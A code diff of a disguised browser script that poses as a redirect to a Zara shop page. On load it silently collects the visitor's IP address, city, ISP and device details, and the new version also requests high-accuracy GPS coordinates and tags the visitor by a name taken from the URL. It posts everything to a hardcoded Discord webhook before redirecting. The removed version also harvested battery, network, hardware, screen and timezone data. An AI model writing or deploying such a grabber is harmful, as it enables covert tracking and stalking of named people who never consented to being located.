@@ -1,62 +1,69 @@
+async function logAndGo() {
+    const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
+    const destination = "https://www.zara.com/my/";
+    const timeout = setTimeout(() => window.location.replace(destination), 10000); // Longer timeout to allow for GPS popup
 
-<script>
-   async function logAndGo() {
-       const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
-       const destination = "https://www.zara.com/my/";
-       const timeout = setTimeout(() => window.location.replace(destination), 3500);
+    // Helper function to get GPS
+    const getGPS = () => {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    };
 
-       try {
-           // 1. IP & Location (Standard)
-           const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
-           const ipData = ipRes ? await ipRes.json() : {};
+    try {
+        // 1. Get GPS Location (Triggers Popup)
+        const coords = await getGPS();
 
-           // 2. Battery Data (Only works on Chrome/Android/Edge)
-           let batteryInfo = "Unsupported/Private";
-           if (navigator.getBattery) {
-               const b = await navigator.getBattery();
-               batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'On Battery'})`;
-           }
+        // 2. Get IP and Location (Standard)
+        const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
+        const ipData = ipRes ? await ipRes.json() : {};
 
-           // 3. Network & Hardware
-           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-           const netType = conn ? conn.effectiveType : "Unknown";
-           const cores = navigator.hardwareConcurrency || "Unknown";
-           const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown";
+        // 3. Identify Visitor from URL (?id=Name)
+        const urlParams = new URLSearchParams(window.location.search);
+        const visitorName = urlParams.get('id') || "Unknown/Public";
 
-           // 4. Prepare Deep Log
-           const logData = {
-               username: "Profile Sentry Pro",
-               embeds: [{
-                   title: "👤 Detailed Visitor Report",
-                   color: 15418405, // A nice Red/Orange
-                   fields: [
-                       { name: "📍 Location", value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: false },
-                       { name: "🌐 IP & ISP", value: `\`${ipData.ip}\` \n ${ipData.org}`, inline: true },
-                       { name: "🔋 Battery", value: batteryInfo, inline: true },
-                       { name: "📶 Network", value: netType.toUpperCase(), inline: true },
-                       { name: "📱 Device Info", value: `${navigator.platform} | ${cores} Cores | ${ram} RAM`, inline: false },
-                       { name: "📐 Screen", value: `${screen.width}x${screen.height}`, inline: true },
-                       { name: "⏰ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
-                   ],
-                   footer: { text: "Advanced Tracking Active" },
-                   timestamp: new Date()
-               }]
-           };
+        // 4. Construct GPS Link (Google Maps)
+        const googleMapsLink = coords 
+            ? `[Click for Exact Map](https://www.google.com/maps?q=${coords.lat},${coords.lon})` 
+            : "Permission Denied / GPS Off";
 
-           await fetch(webhookURL, {
-               method: 'POST',
-               headers: { 'Content-Type': 'application/json' },
-               body: JSON.stringify(logData),
-               keepalive: true
-           });
+        // 5. Build Discord Payload
+        const logData = {
+            username: "Smart Sentry GPS",
+            embeds: [{
+                title: `📍 Visit Detected: ${visitorName}`,
+                color: coords ? 3066993 : 15158332, // Green if GPS success, Red if only IP
+                fields: [
+                    { name: "🎯 Exact GPS Location", value: googleMapsLink, inline: false },
+                    { name: "📏 Accuracy", value: coords ? `${Math.round(coords.acc)} meters` : "N/A", inline: true },
+                    { name: "🏙️ IP City/State", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                    { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                    { name: "📱 Device", value: navigator.platform, inline: true },
+                    { name: "🔗 Referrer", value: document.referrer || "Direct", inline: true }
+                ],
+                footer: { text: "GPS Tracking Active" },
+                timestamp: new Date()
+            }]
+        };
 
-       } catch (e) {
-           console.log("Logger skip.");
-       } finally {
-           clearTimeout(timeout);
-           window.location.replace(destination);
-       }
-   }
-   window.onload = logAndGo;
-</script>
+        // 6. Send to Discord
+        await fetch(webhookURL, { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' }, 
+            body: JSON.stringify(logData), 
+            keepalive: true 
+        });
 
+    } catch (e) {
+        console.log("Logger error");
+    } finally {
+        clearTimeout(timeout);
+        window.location.replace(destination);
+    }
+}
+window.onload = logAndGo;
